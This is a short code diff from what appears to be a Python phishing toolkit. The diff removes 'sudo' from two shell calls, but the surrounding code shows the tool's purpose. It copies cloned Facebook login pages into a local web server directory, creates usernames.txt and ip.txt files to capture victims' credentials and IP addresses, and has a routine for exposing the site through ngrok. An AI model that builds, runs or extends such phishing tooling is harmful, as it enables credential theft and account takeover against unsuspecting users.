@@ -74,7 +74,7 @@ def loadModule(module):
  [{1}*{0}]{1} %s module loaded. Building site...{0}'''.format(CYAN, END) % module)
 
 def runPhishing(social, option2):
-    system('sudo rm -Rf Server/www/*.* && touch Server/www/usernames.txt && touch Server/www/ip.txt && cp WebPages/ip.php Server/www/')
+    system('rm -Rf Server/www/*.* && touch Server/www/usernames.txt && touch Server/www/ip.txt && cp WebPages/ip.php Server/www/')
     if option2 == '1' and social == 'Facebook':
         copy_tree("WebPages/fb_standard/", "Server/www/")
     if option2 == '2' and social == 'Facebook':
@@ -266,7 +266,7 @@ def runNgrok():
     url.close()
 
 def runServer():
-    system("cd Server/www/ && sudo php -S 127.0.0.1:1111")
+    system("cd Server/www/ && php -S 127.0.0.1:1111")
 
 
 
